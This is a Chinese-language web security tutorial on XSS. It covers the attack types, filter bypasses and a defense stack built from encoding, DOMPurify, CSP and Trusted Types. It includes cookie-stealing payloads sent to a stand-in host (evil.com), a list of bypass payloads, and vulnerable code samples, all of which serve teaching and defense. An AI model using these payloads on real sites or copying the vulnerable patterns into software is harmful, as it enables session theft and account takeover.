# XSS 全攻略:反射 / 存储 / DOM / mutation / CSP / Trusted Types

讲 XSS 最大的误区是「我用了 React,自动转义,我没事」——**这种自信是 XSS 漏洞最大的温床**。XSS 之所以二十年杀不死,不是因为开发者不知道要转义,而是因为「在哪转 / 怎么转 / 转完之后浏览器会不会再帮你解一次」**这三个问题在每个上下文都不同**。webLearning/35 用半节讲过 XSS 是什么、Cookie 怎么被偷;**这一篇深挖每一类 XSS 的成因、绕过姿势和现代防御栈**,看完你应该能在白板前讲清「为什么 DOMPurify 装上之后还能被打」。

> 一句话先记住:**XSS = 浏览器把"数据"当成了"代码"**——和 SQL 注入完全同源的错误。**防御 XSS 的核心不是"过滤危险字符",是"明确每个输出位置的上下文(HTML / 属性 / JS / URL / CSS),按上下文做不同的转义,再用 CSP / Trusted Types 兜底"**。任何"我有一个正则把 `<script>` 拦掉"的方案都是 1998 年的思路,现代浏览器有几十种把 JS 跑起来的姿势。

---

## 一、XSS 为什么二十年杀不死

### 1.1 根本原因:浏览器的同源信任模型

浏览器决定「这段 JS 能不能访问你的 Cookie / DOM / localStorage」的唯一标准是 **同源策略(Same-Origin Policy)**——协议 + 域名 + 端口相同,就互相信任。

```
https://bank.com/balance      ──┐
                                ├── 同源,互相完全信任
https://bank.com/profile      ──┘

https://bank.com  vs  https://evil.com  ── 跨源,默认隔离
```

**问题来了**:同源策略只看「JS 从哪个 origin 跑」,不看「JS 是不是 bank.com 的开发者写的」。**只要攻击者能让一段 JS 从 `bank.com` 这个 origin 跑起来,这段 JS 就拥有和合法代码完全一样的权限**——能读 Cookie、能发 fetch、能改 DOM、能伪造任何用户操作。

**XSS 的本质就是把攻击者的 JS 注入到目标域的页面里执行**。一旦注入成功,同源策略不仅没保护你,反而成了攻击者的盾牌——浏览器认为「这是你自己的代码」,所有防御机制都不生效。

### 1.2 第二层原因:HTML / JS 解析的恐怖复杂性

HTML 不是 XML——**它"容错"到病态的程度**。同一段字符串浏览器可能解析出几种完全不同的 DOM 树,这就是攻击面的来源。

```html
<!-- 这些"看起来不像 JS"的东西全都能执行 JS -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">click</a>
<style>@import 'evil.css'</style>
<math><mtext><script>alert(1)</script>
<details open ontoggle=alert(1)>
```

**XSS 攻击面 = 所有能触发 JS 执行的 HTML / CSS / URL 语法**。这个集合一直在膨胀——HTML5 加了 `srcdoc`,新增了几十个事件处理属性;CSS 加了 `@import` 和 expression;甚至 `<meta http-equiv="refresh">` 都能跳到 `javascript:` URL。**指望一个黑名单覆盖完是不可能的**。

### 1.3 第三层原因:数据流穿越多个上下文

一段用户输入从输入到输出,可能跨越很多个解析层:

```
用户输入 → HTTP 参数 → URL 解码 → 后端 ORM → DB 存储
        → 模板引擎 → HTML 序列化 → 浏览器 HTML 解析
        → JS 字符串字面量 → JS 解析 → innerHTML 二次解析 → DOM
```

**每一层都有自己的编码规则**。在 HTML 里安全的 `&lt;` 进到 JS 字符串里可能变成 `<`;在 JS 字符串里安全的 `<` 进到 `innerHTML` 里又会被还原。**防御者要在每一层都做正确的事,攻击者只要找到一个错位就能打穿**。

> 这就是 XSS 和 SQL 注入的**结构性差异**——SQL 注入只有一层(后端拼 SQL),用 prepared statement 就能彻底解决;**XSS 有 N 层,没有任何单一银弹**。

---

## 二、四种 XSS:反射 / 存储 / DOM / mutation

### 2.1 反射型 XSS(Reflected)

**特征**:payload 在 URL 里,服务器把参数原样写回 HTML,只对**点了恶意链接**的用户生效。

```python
# 漏洞代码(Flask)
@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f'<h1>搜索结果:{q}</h1>'  # 直接拼,没转义
```

```
攻击 URL:
https://victim.com/search?q=<script>fetch('//evil.com/?c='+document.cookie)</script>
```

**利用链**:攻击者把链接通过钓鱼邮件 / 论坛 / IM 发给受害者 → 受害者点击 → 浏览器加载页面 → `<script>` 执行 → Cookie 被发到 evil.com。

**反射型一次性、需要社工**——但配上一个短链服务和一个"中奖了点这里"的标题,**钓鱼成功率比你想的高得多**。

### 2.2 存储型 XSS(Stored / Persistent)

**特征**:payload 持久化在数据库,所有访问该页面的用户都中招。**危害最大**——典型场景是评论、留言、用户名、个人简介、私信。

```python
# 漏洞代码
@app.route('/comment', methods=['POST'])
def comment():
    db.save(request.form['text'])  # 原样存

@app.route('/comments')
def show():
    return ''.join(f'<div>{c}</div>' for c in db.all())  # 原样输出
```

攻击者发一条评论:`<img src=x onerror="fetch('//evil.com/?c='+document.cookie)">`——**之后每个看这条评论的用户的 Cookie 都会泄露**。

**存储型 XSS 是最像"病毒"的形态**——如果被注入页是个社交网络主页,**JS 还可以代受害者发同样的恶意评论**,这就是后面要讲的 Samy Worm。

### 2.3 DOM 型 XSS

**特征**:payload **完全不经过服务器**,纯前端 JS 把不可信数据写进了危险 sink。服务器日志里看不到任何攻击痕迹,WAF 也拦不住——**因为流量根本没进 WAF**。

```html
<!-- 漏洞代码:前端从 URL hash 读名字然后塞进 DOM -->
<script>
  const name = location.hash.slice(1);
  document.getElementById('greeting').innerHTML = '你好,' + name;
</script>
```

```
攻击 URL:
https://victim.com/page#<img src=x onerror=alert(1)>
```

`location.hash` 的内容**不会发到服务器**(URL `#` 后面的部分),WAF 完全看不到;但浏览器读到后塞进 `innerHTML`,**`onerror` 立刻执行**。

**DOM 型 XSS 在现代 SPA(React/Vue/Angular)是最主流的 XSS 类型**——因为后端只输出 JSON,前端 JS 负责拼 DOM,**所有数据流都在前端,所有 sink 也都在前端**。

### 2.4 Mutation XSS(mXSS)

**特征**:你以为过滤干净了,但浏览器在二次解析时**"变异"**出了新的 HTML。这是最阴险的一类。

```js
// 你的"安全的" sanitize 后存进 DB:
const safe = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
// 这段 HTML 在 DB 里是这样,看起来 <img> 在 title 属性内,无害

// 但前端再次 innerHTML 设置时,浏览器解析逻辑不同:
div.innerHTML = safe;
// 浏览器看到 <noscript> 在"启用 JS"的页面里被视作 raw text
// 重新序列化时 <p title="..."> 内的 </noscript> 变成结束标签
// 整个结构发生 mutation,<img onerror> 跑出来执行!
```

**mXSS 的根因**:HTML 解析在不同上下文(`<noscript>` / `<template>` / `<svg>` / `<math>` / `innerHTML`)规则不同,**同一段字符串解析出来的 DOM 不一样**。DOMPurify 在 2019 年之前都有过 mXSS 绕过,**是个持续军备竞赛领域**。

### 2.5 四种类型对照

| 类型 | payload 位置 | 触发方式 | 危害范围 | 服务器可见 | WAF 能拦 |
| --- | --- | --- | --- | --- | --- |
| 反射型 | URL 参数 | 用户点链接 | 单用户 | 是 | 部分 |
| 存储型 | 数据库 | 用户访问页面 | 所有访客 | 是 | 部分 |
| DOM 型 | URL hash / postMessage / localStorage | 前端 JS 解析 | 单用户(或自身) | **否** | **否** |
| mXSS | 经过过滤的字符串 | 二次解析 | 看注入点 | 是 | 几乎不能 |

---

## 三、几种"非主流"但很常见的 XSS

### 3.1 Self-XSS

「能 XSS 自己的浏览器,但别人触发不了」——**单看没用,但配合社工就成蠕虫**。

Facebook 当年在 Console 上加过红色大字警告:「**不要把任何东西粘到这里**」——就是因为攻击者会教用户「打开 F12,粘贴这段代码,你就能看见谁访问过你的主页」,用户粘贴后 = 自己给攻击者 XSS 了自己。

### 3.2 postMessage XSS

`window.postMessage` 是跨 origin 通信的合法机制。但接收方如果不校验 `event.origin`,就成了一个"门没锁"的 sink。

```js
// 漏洞代码(在 https://victim.com 内)
window.addEventListener('message', (e) => {
  // 没校验 e.origin!
  document.getElementById('chat').innerHTML += e.data;
});
```

攻击者只要诱导受害者打开 `evil.com`,在 `evil.com` 里 `window.open('https://victim.com')` 然后 `postMessage(...)`,**就完成了跨 origin 把任意 HTML 注入到 victim.com 的 DOM 里**。**修复**:`if (e.origin !== 'https://trusted.com') return;`。

### 3.3 模板注入引发的 XSS

模板引擎(Jinja2 / Handlebars / ERB)如果允许用户控制**模板本身**(不只是数据),就是服务端模板注入(SSTI),**结果通常是 RCE**;**但即便只到 XSS 也是常态**——比如允许用户在 markdown 里嵌入 `{{ }}` 语法的笔记应用,服务端没禁用就 XSS。

### 3.4 文件上传引发的 XSS

允许上传 HTML / SVG 文件并直接以 `text/html` 渲染 = XSS。**SVG 内嵌 `<script>` 也会执行**——这就是为什么头像上传服务一律强制转 PNG / JPG,或者放到独立沙盒域名。

---

## 四、过滤器绕过:十种花式

「我写了个正则过滤 `<script>` 就够了吧?」——下面这些 payload 全部都能绕过你的正则。**这一节列举姿势是为了说明"为什么黑名单不行"**,不是给你抄。

### 4.1 大小写 / 空白 / 标签变体

```html
<ScRiPt>alert(1)</ScRiPt>
<script
  >alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

正则 `/<script>/i` 都会漏掉 `<svg>` 和 `<img onerror>`——**XSS 不需要 `<script>` 标签**,事件处理器属性 (`onload` / `onerror` / `onfocus` / `onclick` / ...) 一抓一大把。

### 4.2 HTML 实体编码嵌套

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">x</a>
<!-- 解码后 = javascript:alert(1) -->
```

浏览器在解析 `href` 属性时**会自动 HTML 实体解码**——你过滤的是字面量 `javascript:`,但实体编码的版本能溜进去。

### 4.3 URL 编码 / 双重编码

```
?q=%3Cscript%3Ealert(1)%3C/script%3E   ← 单次解码后是 <script>
?q=%253Cscript%253E                    ← 双重编码,后端解一次,前端再解一次
```

**编码层数取决于经过几层 URL decode**——一层 nginx + 一层应用框架 + 一层前端 `decodeURIComponent`,**编码 3 次就能绕过只解 2 次的过滤器**。

### 4.4 javascript: 伪协议变体

```html
<a href="java&#x09;script:alert(1)">x</a>    <!-- Tab -->
<a href="java&NewLine;script:alert(1)">x</a> <!-- 换行 -->
<a href="  javascript:alert(1)">x</a>        <!-- 前导空白 -->
```

浏览器对 URL 协议的解析**容忍 tab / 换行 / 前导空白**。这就是为什么 React 现在会在 `href` 看到 `javascript:` 时打警告。

### 4.5 SVG / MathML 子集

```html
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mi xlink:href="javascript:alert(1)">x</mi></math>
```

SVG 是 XML 子集,**允许嵌入 `<script>` 而且语法和 HTML 略有不同**——很多过滤器只考虑 HTML 标签,SVG 的命名空间会绕过。

### 4.6 Data URI

```html
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

Data URI 让你**不依赖外部资源**就能塞一段 HTML。现代浏览器对 `iframe[src=data:]` 有同源限制(被视作 unique origin),但配合 CSP 缺失 + `srcdoc` 还有其他打法。

### 4.7 上下文混淆

```html
<!-- 注入点在 JS 字符串字面量内 -->
<script>var name = "USERINPUT";</script>
<!-- 攻击 payload:";alert(1);// -->
<script>var name = "";alert(1);//";</script>
```

防御者以为「数据在引号里就安全」,但用户输入里塞个引号就跳出去了。**输出在 JS 上下文,需要的是 JS 字符串转义,不是 HTML 实体转义**——`&quot;` 在 JS 字符串里没用,只有 `\"` 才有用。

### 4.8 各种 sink 速查

| Sink | 上下文 | 用户输入会被当成 |
| --- | --- | --- |
| `innerHTML` / `outerHTML` | HTML | 标签、属性、JS |
| `document.write` / `writeln` | HTML | 同上,而且影响整个文档解析 |
| `insertAdjacentHTML` | HTML | 同上 |
| `eval` / `Function` / `setTimeout(str, ...)` | JS | JS 代码 |
| `element.src` / `iframe.src` | URL | 可能是 `javascript:` |
| `element.href` (a, link, base) | URL | 可能是 `javascript:` |
| `location` / `location.href` | URL | 可能是 `javascript:` |
| `element.style` / `style.cssText` | CSS | `expression()` (旧 IE)、`url(javascript:)` (旧浏览器) |
| `<script>.text` / `.textContent` | JS | JS 代码 |

> 各种 Source(攻击者可控的输入源)主要是:`location.*`、`document.referrer`、`document.cookie`、`window.name`、`localStorage`、`postMessage`、`fetch().json()`、`URL parameter`。**你的工作是确保「source → sink」这条路径上做了正确的清洗**。

---

## 五、防御:从单点到纵深

### 5.1 第一层:输出编码必须是 context-aware

这是**最重要的一条**:**不存在"通用转义函数"**。每个输出上下文用不同的转义规则。

| 输出在哪 | 怎么转 | 危险字符 |
| --- | --- | --- |
| HTML 文本节点 | HTML 实体 (`&lt;` `&gt;` `&amp;` `&quot;` `&#39;`) | `< > & " '` |
| HTML 属性(有引号) | HTML 实体 | 同上,且必须有引号 |
| HTML 属性(无引号) | **不要无引号**,空格 / `=` / 换行都能逃逸 | 几乎所有 |
| URL 参数 | `encodeURIComponent` | `&` `=` `?` `#` `+` 空格 |
| URL 协议位置 (`href` / `src`) | 白名单(`http:` / `https:` / `mailto:`)拒绝 `javascript:` 等 | `javascript:` `data:` |
| JS 字符串字面量 | `\xHH` / `\uHHHH` 编码,**不要用 HTML 实体** | `" ' \ \n \r U+2028 U+2029` |
| JSON 嵌入 HTML | `</` 要变成 `<\/`,防止 `</script>` 闭合 | `< > & ` |
| CSS 值 | `\HH` 编码 | 几乎所有非字母数字 |

**记住一句**:**先确定上下文,再选转义函数**。OWASP Java Encoder、Apache Commons Text 的 `StringEscapeUtils`、Python `html.escape` + `markupsafe`,都是按上下文分函数的。**只有一个 `escape()` 的库不要用**。

### 5.2 第二层:框架默认转义,但要小心"绕过门"

**React / Vue / Angular 默认所有 `{}` 插值都做 HTML 转义**——这就是为什么现代框架的 XSS 比 jQuery 时代少得多。

```jsx
// React 默认安全
<div>{userInput}</div>  // userInput 中的 < > 会自动转义
```

**但每个框架都留了"逃生门"**,而这些逃生门就是 XSS 高发地:

| 框架 | 危险 API | 含义 |
| --- | --- | --- |
| React | `dangerouslySetInnerHTML={{__html: x}}` | 直接塞 HTML |
| Vue | `v-html="x"` | 直接塞 HTML |
| Angular | `bypassSecurityTrustHtml(x)` / `[innerHTML]` | 直接塞 HTML |
| Svelte | `{@html x}` | 直接塞 HTML |

**另外即使是默认转义也有坑**:

- `href={userInput}` —— React 17- 不拦 `javascript:`,React 18+ 才警告。**自己加 URL 协议白名单**。
- `style={{color: userInput}}` —— React 不转义 CSS 值,`url(javascript:...)` 在老浏览器能跑。
- 服务端注水(SSR)时数据 inline 进 `<script>` 标签里,**JSON 中的 `</script>` 会闭合脚本**——必须用 `<\/script>` 编码。

### 5.3 第三层:DOMPurify 处理"必须允许富文本"的场景

评论区 / 邮件正文 / 富文本编辑器需要允许 `<b>` `<i>` `<a>` 这些标签——**这种场景不能简单转义,必须用 HTML sanitizer**。

```js
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHTML, {
  ALLOWED_TAGS: ['b', 'i', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});
div.innerHTML = clean;
```

**不要自己写 sanitizer**——mXSS 和浏览器解析差异多到吓人,只有 DOMPurify 这种维护多年、跟着浏览器更新的库才靠谱。**自己写正则 = 一定漏**。

### 5.4 第四层:CSP(Content Security Policy)兜底

CSP 是**浏览器侧**的策略,告诉浏览器「这个页面只允许从哪些 origin 加载脚本、只允许执行 inline / eval 吗」。**就算被 XSS,如果攻击者注入的 `<script>` 不符合 CSP,浏览器拒绝执行**。

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-RANDOM123';
  object-src 'none';
  base-uri 'none';
```

```html
<!-- 合法脚本带 nonce -->
<script nonce="RANDOM123">/* 自家代码 */</script>
<!-- 攻击者注入的脚本没 nonce → 浏览器拒绝执行 -->
<script>alert(1)</script>
```

**关键策略要点**:

- **不要 `'unsafe-inline'`**——一开就废了大半防御。改用 nonce / hash。
- **不要 `'unsafe-eval'`**——`eval` / `new Function` / `setTimeout(str, ...)` 全禁。
- **`object-src 'none'`** —— 防 Flash / 老 plugin 绕过。
- **`base-uri 'none'`** —— 防 `<base href=//evil.com>` 把所有相对 URL 改方向。
- **`script-src 'strict-dynamic'`** —— 现代推荐,基于信任传播。

**CSP 不能替代输出编码**,只是**「即便编码漏了也要让攻击者再翻一座山」的纵深防御**——但这座山很高,Google 内部 XSS 几乎都靠 CSP 顶住。

### 5.5 第五层:Trusted Types(W3C 标准,Chrome / Edge 已支持)

CSP 的进化版,**直接禁止把字符串赋值给 DOM sink**——除非这个字符串经过显式的 Trusted Type 工厂。

```http
Content-Security-Policy: require-trusted-types-for 'script'
```

```js
// 没有这个就 throw
const policy = trustedTypes.createPolicy('my-policy', {
  createHTML: (s) => DOMPurify.sanitize(s),
});
div.innerHTML = policy.createHTML(userInput);
// 直接 div.innerHTML = userInput → TypeError
```

**Trusted Types 把 XSS 从"运行时偶发漏洞"变成"编译时静态错误"**——所有 sink 必须显式走可信工厂,审计起来直接 `grep createPolicy` 看有几个、写得对不对。**这是现代防 XSS 的终极武器**。

### 5.6 第六层:辅助加固

- **HttpOnly Cookie**:JS 读不到 Cookie,**XSS 至少偷不走 session**。但攻击者还能用 XSS **以受害者身份发请求**,所以这只是降低危害,不是防 XSS。
- **SameSite Cookie**:防 CSRF 为主,但能阻止 XSS 拿到的 Cookie 被跨站利用。
- **Subresource Integrity (SRI)**:`<script integrity="sha384-...">` —— CDN 被投毒时拒绝执行。
- **沙盒域名 / sandbox iframe**:富文本预览、用户上传 HTML、广告、第三方组件,**全放进 `<iframe sandbox>` 或 cookieless 子域名**——就算 XSS 也打不到主站。

### 5.7 防御层次速查

| 层 | 机制 | 解决什么 |
| --- | --- | --- |
| 1 | Context-aware 输出编码 | 95% 的反射 / 存储 XSS |
| 2 | 框架默认转义 + 慎用 `dangerouslySetInnerHTML` | DOM XSS 主战场 |
| 3 | DOMPurify(必须富文本时) | 富文本场景 |
| 4 | CSP nonce + 'strict-dynamic' | 编码漏了的兜底 |
| 5 | Trusted Types | 把 sink 漏洞编译期暴露 |
| 6 | HttpOnly / SameSite / SRI / sandbox iframe | 降危害 + 攻击面隔离 |

**任何一层都不够,六层叠加才接近不可打**。

---

## 六、两个历史教科书案例

### 6.1 Samy Worm(MySpace,2005)

**第一个真正意义上的 XSS 蠕虫**——19 岁的 Samy Kamkar 在 MySpace 个人主页注入了一段 JS,所有访问他主页的用户会自动:

1. 把 Samy 加为好友;
2. 把这段 JS 复制到自己的主页;
3. 留言 "but most of all, samy is my hero"。

**蠕虫 20 小时内感染了 100 万账户**,把 MySpace 干瘫。Samy 被起诉,判 3 年缓刑 + 90 天社区服务。

**技术上为什么能打**:

- MySpace 允许用户在 profile 里写 CSS——攻击者通过 CSS `background:url(...)` 加载远程内容。
- MySpace 过滤了 `<script>`,但没过滤事件属性 `onload` / `onclick`。
- MySpace 过滤了 `javascript:`,但 `java\nscript:`(带换行)能绕过。
- MySpace 过滤了 `"`,但 `&quot;` 不过滤,JS 里再 `eval(...)`。
- AJAX 让蠕虫**不需要用户点任何东西**就能自动传播。

**修复后**:MySpace 转为白名单 sanitizer + CSP。但 Samy Worm 永远是 XSS 历史的零号病毒。

### 6.2 TweetDeck XSS 蠕虫(2014)

TweetDeck(Twitter 官方桌面客户端)有个 XSS,**只要 payload 出现在 Tweet 里,任何在 TweetDeck 看这条推的用户就中招**。

漏洞核心:TweetDeck 把推文内容用 `innerHTML` 渲染,只过滤了 `<script>`,但 `<` 紧跟字母的标签**未过滤**——攻击者用 `<sCrIpT>...</sCrIpT>` 大小写混淆就绕过。配合 Twitter 转推机制,**蠕虫几分钟传遍整个 TweetDeck 用户群**。

**Twitter 紧急下线 TweetDeck 几小时,迁移到 React 默认转义之后才修复**。

> 这两个案例的共同点:**当一个有 XSS 的页面同时是社交分发节点(profile / feed / 评论区),XSS 就从"单点漏洞"升级为"病毒"**——攻击面 = 用户数 × 社交连通度。

---

## 七、踩坑提醒

1. **以为 React 默认转义就安全**——`dangerouslySetInnerHTML` / `href={userInput}` / `style={userInput}` 全是漏点。
2. **以为 `escape()` 一把梭**——不存在"通用 escape",必须按上下文选。
3. **以为黑名单能行**——只要列举攻击姿势,你的列表永远不全。**用白名单 sanitizer**。
4. **以为前端校验够了**——所有客户端校验都能绕过,**输入和输出都要在服务端 + 浏览器双重处理**。
5. **以为 HttpOnly Cookie 就能防 XSS**——HttpOnly 只防偷 Cookie,**不防代你发请求 / 钓密码 / 改 DOM 钓钱包私钥**。
6. **以为 Markdown 渲染天然安全**——大多数 Markdown 库支持 raw HTML 嵌入,**必须显式 disable HTML + 走 sanitizer**。
7. **以为 URL hash 不进服务器就安全**——DOM XSS 就活在前端,服务器日志看不到,**必须前端代码审计**。
8. **以为装了 DOMPurify 就万事大吉**——mXSS 是个持续军备竞赛,**库要定期升级**;sanitizer 配置错了一样裸奔(允许 `onerror` 属性 / `script` 标签)。
9. **以为 CSP 是「设了就行」**——`unsafe-inline` + `unsafe-eval` 一开,CSP 等于没设。用 CSP Evaluator 工具检查策略强度。
10. **以为内网 / 后台系统不会被 XSS**——内部 ERP 一旦 XSS,权限和外网用户一样大;**蓝队和红队都喜欢打内部系统**。

---

## 八、本篇核心

把 XSS 想清楚就一句话:**「不可信数据 + 错误的输出位置 = 浏览器把数据执行成代码」**。

**防御不是"过滤危险字符",是「四个动作」**:

```
1. 边界明确:每个输出位置标注上下文(HTML / JS / URL / CSS)
2. 编码到位:按上下文选编码函数,框架默认就用框架的
3. 富文本走 sanitizer:必须允许 HTML 的场景用 DOMPurify
4. 浏览器兜底:CSP nonce + strict-dynamic + Trusted Types
```

**写代码时的本能反应应该是**:看到任何 `innerHTML` / `document.write` / `eval` / `dangerouslySetInnerHTML` / `v-html` / `bypassSecurityTrust*` —— **停下来想 30 秒**,这个数据从哪来,经过了什么处理,我能不能换成 `textContent` 或者过 sanitizer。**这个 30 秒的习惯,值百万行代码**。

---

下一篇:`11-CSRF与同源策略.md`,讲清楚浏览器的「同源策略 / CORS / SameSite Cookie / CSRF Token」这一整套同源信任模型——为什么浏览器允许跨站 `<img src>` 但不允许 `fetch`、SameSite=Lax 的精确语义、CSRF Token 双重提交 vs Synchronizer Token 的取舍、以及当代「为什么 CSRF 这个漏洞类别在新框架里几乎消失但仍然要懂」的原因。
